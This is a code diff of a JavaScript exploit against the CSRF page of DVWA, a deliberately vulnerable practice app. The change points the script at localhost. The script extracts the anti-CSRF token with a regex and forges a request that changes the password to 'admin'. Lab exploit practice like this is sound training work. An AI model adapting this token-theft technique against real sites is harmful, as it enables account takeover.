@@ -2,7 +2,7 @@
     /**
      * Author hd7exploit
      */
-    var theUrl = 'http://pentest.wp/dvwa/vulnerabilities/csrf/';
+    var theUrl = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/';
     var pass = 'admin';
     if (window.XMLHttpRequest){
         xmlhttp=new XMLHttpRequest();
@@ -18,7 +18,7 @@
             var regex = /user_token\' value\=\'(.*?)\' \/\>/;
             var match = text.match(regex);
             var token = match[1];
-            var new_url = 'http://pentest.wp/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
+            var new_url = theUrl + '?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
             if(!hacked){
                 alert('Got token:' + match[1]);
                 hacked = true;
